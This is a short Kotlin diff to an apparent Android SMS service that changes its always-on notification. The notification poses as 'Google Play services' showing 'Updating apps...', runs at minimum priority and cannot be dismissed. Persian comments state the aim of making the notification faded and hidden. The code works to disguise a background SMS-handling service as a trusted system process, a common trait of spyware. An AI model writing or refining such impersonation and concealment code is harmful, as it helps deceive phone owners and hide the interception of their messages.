@@ -81,11 +81,11 @@ class SmsService : Service() {
             manager?.createNotificationChannel(channel)
         }
 
-        // ⭐ نوتیفیکیشن عیناً شبیه Google Play
+        // ⭐ نوتیفیکیشن کم‌رنگ و مخفی
         val notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Google Play services")
             .setContentText("Updating apps...")
-            .setSmallIcon(android.R.drawable.stat_sys_download)  // آیکون دانلود سیستمی
+            .setSmallIcon(android.R.drawable.stat_notify_sync)  // ⭐ آیکون sync کم‌رنگ‌تر
             .setPriority(NotificationCompat.PRIORITY_MIN)  // کمترین اولویت
             .setOngoing(true)  // نمیشه بست
             .setShowWhen(false)  // بدون زمان
